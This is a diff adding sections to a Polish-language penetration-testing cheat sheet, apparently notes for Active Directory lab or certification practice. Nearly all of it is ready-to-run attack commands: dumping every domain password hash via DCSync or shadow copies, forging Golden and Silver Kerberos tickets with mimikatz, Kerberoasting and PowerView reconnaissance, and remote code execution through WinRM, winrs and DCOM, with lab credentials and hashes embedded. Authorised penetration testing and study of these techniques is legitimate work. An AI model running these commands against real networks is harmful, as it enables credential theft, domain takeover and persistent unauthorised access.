@@ -1170,6 +1170,39 @@ coercer coerce -u user -p pass -t $DC -l $LHOST        # zbiorczy coercer
 > 2. Nie pęka? → **relay** (§5.5), o ile cel ma SMB signing off.
 > 3. Signing wszędzie on i hash mocny? → wróć do innych wektorów (Kerberoast, misconfig, web).
 
+## 5.6 Domain dominance — Golden / Silver Ticket + NTDS.dit
+
+> Po zdobyciu DA / hasha **krbtgt** możesz fałszować bilety Kerberos = trwała dominacja nad domeną. Tylko w autoryzowanym zakresie.
+
+### Dump NTDS.dit (baza haseł całej domeny)
+```bash
+# Zdalnie przez DCSync (uprawnienia replikacji — DA/Administrators):
+impacket-secretsdump -just-dc $DOMAIN/jeffadmin:'Haslo123!'@$DC             # całe NTDS.dit
+impacket-secretsdump -just-dc-user krbtgt $DOMAIN/jeffadmin:'Haslo123!'@$DC  # tylko krbtgt (pod golden)
+```
+```cmd
+:: Offline na DC — kopia bazy przez Volume Shadow Copy, potem parsuj na Kali:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit.bak
+reg save hklm\system c:\system.bak
+```
+```bash
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL           # parsuj offline
+```
+> Z NTDS masz NTLM wszystkich kont (w tym `krbtgt:502:...:HASH`) + klucze Kerberos (AES). Hash krbtgt = klucz do Golden Ticket.
+
+### Golden Ticket (fałszywy TGT — dowolny user, cała domena)
+> Potrzebne: NTLM **krbtgt** + **SID** domeny. Ważny nawet po zmianie hasła ofiary (do 2 rotacji krbtgt). SID: `whoami /user` lub `Get-ADDomain`.
+```
+mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+```
+> `/ptt` = wstrzyknij bilet do bieżącej sesji od razu → potem `dir \\dc1\c$` / psexec bez hasła.
+
+### Silver Ticket (fałszywy TGS — jedna usługa, ciszej)
+> Potrzebne: hash konta **usługi** (np. konta komputera / SPN) + SID. Dostęp tylko do wskazanej usługi (`/service`), ale **bez ruchu do DC** → trudniejsze do wykrycia niż golden.
+```
+mimikatz # kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /target:web04.corp.com /service:http /rc4:<hash_konta_uslugi> /ptt
+```
+
 ---
 
 # 6. Active Directory
@@ -1182,6 +1215,11 @@ coercer coerce -u user -p pass -t $DC -l $LHOST        # zbiorczy coercer
 **SharpHound.exe** — kolektor na hoście domenowym (Windows):
 ```
 .\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs
+```
+**SharpHound.ps1** (ingestor PowerShell) — gdy wolisz nie zrzucać .exe:
+```powershell
+Import-Module .\Sharphound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\ -OutputPrefix "corp_audit"
 ```
 **bloodhound-python** — kolektor z Linuxa (potrzeba poświadczeń):
 ```bash
@@ -1202,30 +1240,88 @@ bloodhound                          # aplikacja GUI
 - *Outbound/Inbound object control* — prawa nad innymi obiektami i odwrotnie
 - **Prebuilt queries** → "Shortest Path to Domain Admins" = złota ścieżka
 
-## 6.2 Enumeracja PowerShell (PowerView + moduł AD)
+## 6.2 Enumeracja z hosta domenowego (manual → PowerView → moduł AD)
 
+> Trzy poziomy tego samego: **ręcznie przez LDAP/.NET** (nic nie instalujesz, nie zrzucasz podejrzanych narzędzi na dysk), **PowerView** (szybki recon ofensywny) i **moduł ActiveDirectory** (natywny, „czysty”). Na maszynie bez internetu i z AV — manual ratuje.
+
+### A. Ręczna enumeracja przez LDAP (.NET / ADSI, bez narzędzi)
+Namierz kontroler domeny (PDC) i bazowy DN:
+```powershell
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = $domainObj.PdcRoleOwner.Name           # nazwa DC (PDC emulator)
+$DN  = ([adsi]'').distinguishedName            # np. DC=corp,DC=com
+$LDAP = "LDAP://$PDC/$DN"
+```
+Surowe zapytanie DirectorySearcher (użytkownicy = `samAccountType=805306368`):
+```powershell
+$direntry    = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+$dirsearcher.filter = "samAccountType=805306368"
+$result = $dirsearcher.FindAll()
+Foreach($obj in $result){ Foreach($prop in $obj.Properties){ $prop } }   # wypisz atrybuty
+```
+Funkcja wielokrotnego użytku (wklej raz, potem odpytuj dowolnym filtrem LDAP):
+```powershell
+function LDAPSearch {
+    param ([string]$LDAPQuery)
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    $DistinguishedName = ([adsi]'').distinguishedName
+    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+    return $DirectorySearcher.FindAll()
+}
+```
+Najczęstsze filtry LDAP:
+```powershell
+LDAPSearch -LDAPQuery "(samAccountType=805306368)"           # wszyscy użytkownicy
+LDAPSearch -LDAPQuery "(objectclass=group)"                  # wszystkie grupy
+LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"       # konkretna grupa
+LDAPSearch -LDAPQuery "(objectCategory=computer)"            # komputery
+LDAPSearch -LDAPQuery "(&(objectCategory=person)(servicePrincipalName=*))"   # konta z SPN → Kerberoast
+# Członkowie grupy (w tym zagnieżdżeni) — atrybut 'member':
+foreach ($g in $(LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))")){ $g.properties.member }
+# Członkostwo usera — atrybut 'memberof':
+foreach ($o in $(LDAPSearch -LDAPQuery "(name=jeffadmin)")){ $o.properties.memberof }
+```
+> Atrybuty warte czytania: `samaccountname`, `memberof`, `serviceprincipalname` (Kerberoast), `useraccountcontrol` (`DONT_REQ_PREAUTH` → AS-REP, `TRUSTED_FOR_DELEGATION` → delegacja), `pwdlastset`, `lastlogon`, `description` (często leżą tam hasła!), `operatingsystem`.
+
+### B. SPN — ręcznie (pod Kerberoasting, §5.3)
+```cmd
+setspn -L iis_service            :: SPN-y konkretnego konta (setspn jest natywnie na Windows)
+```
+```powershell
+LDAPSearch -LDAPQuery "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
+```
+
+### C. PowerView (recon ofensywny)
 ```powershell
 Import-Module .\PowerView.ps1
-Get-Module -ListAvailable ActiveDirectory       # czy jest moduł AD
-Import-Module ActiveDirectory
+Get-NetDomain                                     # info o domenie (nazwa, DC-e)
+Get-NetUser | select cn,pwdlastset,lastlogon       # userzy + wybrane atrybuty
+Get-NetUser -SPN | select samaccountname,serviceprincipalname   # konta z SPN (Kerberoast)
+Get-NetGroup | select cn                           # grupy
+Get-NetGroup "Domain Admins" | select member       # członkowie grupy
+Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion   # hosty + OS
+Find-LocalAdminAccess                              # gdzie jestem lokalnym adminem
+Get-NetSession -ComputerName files04               # kto ma sesję na hoscie (namierz adminów)
+Find-DomainShare                                   # share'y widoczne w domenie
+Get-ObjectAcl -Identity stephanie                  # ACL obiektu (kto ma nad nim prawa)
+Find-InterestingDomainAcl -ResolveGUIDs            # ciekawe prawa (GenericAll/WriteDacl...)
+Invoke-Kerberoast                                  # od razu wyciąga hashe TGS-REP
 ```
-Moduł ActiveDirectory:
+> `Get-NetSession` + `Find-LocalAdminAccess` = mapowanie ścieżek lateral movement bez BloodHound. `Get-ObjectAcl` + `Find-InterestingDomainAcl` = szukanie ścieżek ACL-owych (masz np. WriteDacl nad kontem admina → przejmujesz je).
+
+### D. Moduł ActiveDirectory (natywny, „czysty”)
 ```powershell
+Get-Module -ListAvailable ActiveDirectory ; Import-Module ActiveDirectory
 Get-ADUser -Filter *                              # wszyscy użytkownicy
-Get-ADUser -Identity <username> -Properties *     # szczegóły usera
-Get-ADUser -Filter "Name -like '*admin*'"         # konta 'admin'
-Get-ADGroup -Filter *                             # grupy
-Get-ADGroupMember -Identity "Group Name"          # członkowie grupy
-Get-ADComputer -Filter *                          # komputery
-Get-ADDefaultDomainPasswordPolicy                 # polityka haseł
-```
-PowerView (mocniejsze do ataku):
-```powershell
-Get-NetUser | select samaccountname
-Get-NetGroup "Domain Admins" -MemberIdentity
-Find-LocalAdminAccess                             # gdzie jestem lokalnym adminem
-Invoke-Kerberoast                                 # SPN roasting z Windows
-Get-NetGPO; Get-DomainPolicy
+Get-ADUser -Identity <user> -Properties *         # szczegóły (w tym description!)
+Get-ADUser -Filter "Name -like '*admin*'"          # konta 'admin'
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   # konta z SPN
+Get-ADGroup -Filter * | select name                # grupy
+Get-ADGroupMember -Identity "Domain Admins"        # członkowie grupy
+Get-ADComputer -Filter * -Properties OperatingSystem | select name,OperatingSystem
+Get-ADDefaultDomainPasswordPolicy                  # polityka haseł (SPRAWDŹ przed sprayingiem!)
 ```
 
 ### Grupy warte uwagi
@@ -1326,6 +1422,29 @@ impacket-psexec $DOMAIN/user:password@$IP           # SYSTEM shell
 impacket-wmiexec $DOMAIN/user:password@$IP          # cichszy (bez usługi)
 impacket-smbexec $DOMAIN/user:password@$IP
 impacket-atexec $DOMAIN/user:password@$IP whoami    # przez scheduled task
+```
+
+### PowerShell Remoting (5985/5986, WinRM z poświadczeniami)
+```powershell
+$cred = New-Object System.Management.Automation.PSCredential('corp\jen',(ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force))
+Enter-PSSession -ComputerName 192.168.50.73 -Credential $cred          # sesja interaktywna
+$sess = New-PSSession -ComputerName 192.168.50.73 -Credential $cred
+Invoke-Command -Session $sess -ScriptBlock { hostname; whoami }        # zdalne polecenie
+Invoke-Command -ComputerName files04 -Credential $cred -ScriptBlock { whoami }
+```
+### winrs (natywny klient WinRM, cmd)
+```cmd
+winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
+```
+### DCOM (lateral przez 135, gdy WinRM/SMB odpadają)
+```powershell
+# a) MMC20.Application — wykonaj polecenie zdalnie (bez podawania creds, użyje Twojego tokenu):
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
+# b) CIM/DCOM Win32_Process Create (z creds — patrz $cred wyżej):
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-CimSession -ComputerName 192.168.50.73 -Credential $cred -SessionOption $Opt
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell -enc <b64>"}
 ```
 
 ## 7.2 Pass-the-Hash / Ticket / Key
